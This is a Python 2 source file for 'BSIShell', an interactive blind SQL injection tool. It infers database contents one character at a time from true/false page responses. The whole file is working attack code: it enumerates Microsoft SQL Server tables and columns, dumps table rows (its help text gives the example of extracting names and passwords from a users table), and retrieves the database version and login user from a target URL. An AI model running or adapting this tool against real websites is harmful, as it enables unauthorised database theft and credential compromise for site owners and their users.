#!/usr/bin/env python

'''
Blind SQL injection Python shell

BSIShell is a simple python script that permits blind SQL injection.

by Rodrigo Marcos

'''
import urllib2
import urllib
import string
import sys

TRUE_CONDITION = '1=1' # substring((select 'a'),1,1)='a'
FALSE_CONDITION = '1=2' # substring((select 'a'),1,1)='b'
MAX_LENGTH = 256
MAX_NUM = 1024
	
pre = ''
post = ''	

result_true = ''
result_false = ''

ready = 0

def check():
	global ready
	
	if ready:
		return 1
	else:
		prepare()
		return ready
	
def prepare():	
	global result_true
	global result_false
	global ready
	
	if pre == '':
		print '[+] Error: at least "pre" parameter has to be set'
		ready = 0
		return

	print '[+] Learning true/false results'
	result_true = dorequest(TRUE_CONDITION)
	result_false = dorequest(FALSE_CONDITION)

	#print result_true
	#print result_false
	
	if result_true == result_false:
		print '[+] Error: I could not identify true/false conditions. The following requests returned the same data:'
		print '\t - ' + pre + TRUE_CONDITION + post
		print '\t - ' + pre + FALSE_CONDITION + post
		#sys.exit(0)
		ready = 0
		return
	else:
		print '[+] Retrieved true/false conditions. Ready to start.'
		ready = 1
		return

def dorequest(sql):
#this function makes a request and returns the response

	request = pre + sql + post
	#print request
	request = string.replace(request, ' ', '%20')
	req = urllib2.Request(request)
	#req.add_header('Host', '172.30.3.230')
	#req.add_header('Cookie', 'JSESSIONID=8D6286F331B4614B7B60680FDA913112; marathon=ok')
	try:
		r = urllib2.urlopen(req)
	except urllib2.URLError, msg:
		print "[+] Error: Error requesting URL (%s)" % msg
	return r.read()

def getspace(sqlrequest, position):
#This function detects if the the item is a lowercase/uppercase character or a number
	#return range(32,127)
	upper = 0
	lower = 0
	number = 0
		
	request = "ASCII(UPPER(SUBSTRING((" + sqlrequest + "), " + str(position) + ", 1)))= ASCII(SUBSTRING((" + sqlrequest + "), " + str(position) + ', 1))'
	if dorequest(request)==result_true:
		upper = 1

	request = "ASCII(LOWER(SUBSTRING((" + sqlrequest + "), " + str(position) + ", 1)))= ASCII(SUBSTRING((" + sqlrequest + "), " + str(position) + ', 1))'
	if dorequest(request)==result_true:
		lower = 1

	if upper and lower:
		#if upper and lower are true, that means that it is a number or a symbol
		return range(32, 65) + range(91,97) + range(123,127)
	elif upper:
		return range(65,91)
	else:
		return range(97,123)


def detectend(sqlrequest, position):
#this function will detect if the request returns a null
	request = "ASCII(SUBSTRING((" + sqlrequest + "), " + str(position) + ", 1)) IS NULL"
	if dorequest(request)==result_true:
		return 1
	else:
		return 0

def getvalue(sqlquery, position, space):
#this function searchs a certain position and get they result

	#We first perform some approximation
	while len(space)>8:
		space = approximate(sqlquery, position, space)	
	
	#We now continue bruteforcing the remaining space
	for letter in space:
		request = "ASCII(SUBSTRING((" + sqlquery + "), " + str(position) + ', 1))=' + str(letter)
		if dorequest(request)==result_true:
			return chr(letter)
	return '.'	

def approximate(sqlquery, position, space):
	middle = len(space)/2
	request = "ASCII(SUBSTRING((" + sqlquery + "), " + str(position) + ', 1))>=' + str(space[middle])
	#print request
	if dorequest(request)==result_true:
		return space[middle:] # second half
	else:
		return space[:middle] # first half

##########################################################################################################
#	Low level functions
##########################################################################################################

def getnumericvalue(sqlquery):
	if not check():
		return
	for num in range(0,MAX_NUM):
		request = '(' + sqlquery + ")=" + str(num)
		if dorequest(request)==result_true:
			#print str(num)
			return num

def getstringvalue(sqlquery, show=0, slen = MAX_LENGTH):
	if not check():
		return
	result = ''
	for position in range(1,slen+1):
		if detectend(sqlquery, position):
			break
		letter = getvalue(sqlquery, position, getspace(sqlquery, position))
		if show:
			print letter,
		result += letter
	return result

##########################################################################################################
#	High level functions
##########################################################################################################

def table_enumeration():
	if not check():
		return
	#table enumeration
	print '[+] Starting table enumeration'
	sqlquery = 'SELECT COUNT(name) FROM sysobjects WHERE xtype=char(85)'
	n_tables = getnumericvalue(sqlquery)
	print '\t [+] Number of tables detected: ' + str(n_tables)

	tableid = '0'
	for tablecounter in range(1,n_tables+1):
		
		print '\t\t [+] Table ' + str(tablecounter) + ':'
		sqlquery = 'SELECT cast(MIN(id) as varchar) FROM sysobjects WHERE xtype=char(85) and id>' + tableid 
		tableid = string.replace(getstringvalue(sqlquery), ' ', '')
		print '\t\t\t ID: ' + tableid

		#sqlquery = 'select TOP 1 LEN(name) from sysobjects where id=' + tableid + ' AND xtype=char(85)'
		#bi.getnumericvalue(sqlquery)

		sqlquery = 'select name from sysobjects where id=' + tableid 
		tablename = string.replace(getstringvalue(sqlquery), ' ', '')
		print '\t\t\t Name: ' + tablename

		sqlquery = 'SELECT COUNT(*) FROM ' + tablename
		nrows = getnumericvalue(sqlquery)
		print '\t\t\t # Rows: ' + str(nrows)

		sqlquery = 'SELECT COUNT(name) FROM syscolumns WHERE id=' + tableid
		ncols = getnumericvalue(sqlquery)
		print '\t\t\t # Cols: ' + str(ncols)

		# Column enumeration
		colid = 0
		for colcounter in range(1, ncols+1):
			sqlquery = 'SELECT MIN(colid) FROM syscolumns WHERE colid > ' + str(colid) + ' AND id=' + tableid
			colid = getnumericvalue(sqlquery)

			sqlquery = 'SELECT name FROM syscolumns where id=' + tableid + ' AND colid=' + str(colid)
			col = getstringvalue(sqlquery)
			print '\t\t\t\t - ' + col

def table_content(table, colid, columns):
	if not check():
		return
	print '[+] Starting table content retrieval'
	print '\t [+] Table: ' + table
	print '\t [+] Column ID: ' + colid
	print '\t [+] Target Cols: ' + str(columns)
	sqlquery = 'SELECT COUNT(' + colid + ') FROM ' + table
	nrows = getnumericvalue(sqlquery)
	print '\t\t\t # Rows: ' + str(nrows)
	
	if nrows>0:
		sqlquery = 'SELECT MIN(' + colid + ') FROM ' + table
		mincolid = getnumericvalue(sqlquery) - 1
			
		for rowcounter in range(1, nrows + 1):
			sqlquery = 'SELECT MIN(' + colid + ') FROM ' + table + ' WHERE ' + colid + ' > ' + str(mincolid)
			mincolid = getnumericvalue(sqlquery)
			result = '\t\t\t\t' + str(mincolid) + '.- '
			for column in columns:
				sqlquery = 'SELECT ' + column + ' FROM ' + table + ' WHERE ' + colid + ' = ' + str(mincolid)
				col = getstringvalue(sqlquery)
				result += ' \t ' + col
			print result
	
def version():
	if not check():
		return
	print '[+] Starting version retrieval'
	print '[+] As this takes a while, results will be shown as they are discovered'		
	sqlquery = 'select @@version'
	result = getstringvalue(sqlquery, 1)
	print
	print result

def user():
	if not check():
		return
	print '[+] Starting user retrieval'
	#For some reason, we need to detect length first as it doesn't respond with nulls
	
	sqlquery = 'select LEN(a.loginame) from main..sysprocesses as a where a.spid=@@SPID'
	userlen = getnumericvalue(sqlquery)
	
	sqlquery = 'select a.loginame from main..sysprocesses as a where a.spid=@@SPID'
	loginname = getstringvalue(sqlquery,0,userlen)
	
	sqlquery = 'select LEN(user)'
	userlen = getnumericvalue(sqlquery)
	
	sqlquery = 'select user'
	user = getstringvalue(sqlquery,0,userlen)
	
	print '[+] User: ' + loginname + ' (' + user + ')'
	
def help():
	
	print '''
Blind SQL Injection Shell

Preparation:
	- Set the pre and post parameters
		eg. pre = "http://vulnerable/id=1' and "
		eg. post = " or '1'='2"
	
High Level Functions:
	- user() - Displays the database user
	- version() - Displays the version of the database server
	- table_enumeration() - Displays database structure
	- table_content(table, id_column, colummns) - Displays the content on the database
		eg. table_content('users', 'id', ['name', 'password'])

Low Level Functions:
	- getnumericvalue(sqlquery) - Returns a numeric value from the database
		eg. getnumericvalue('select LEN(user)')
	- getstringvalue(sqlquery, [verbose],[length]) - Returns a string value from the database
		eg. getstringvalue('select @@version')

Others:
	- help() - This help output
	- quit() - Quit
		'''
		

def quit():
	sys.exit(0)
##########################################################################################################
#	Main
##########################################################################################################

if __name__ == '__main__':
	import code
	banner = 'Blind SQL injection shell'
	code.interact(banner=banner, local=globals())
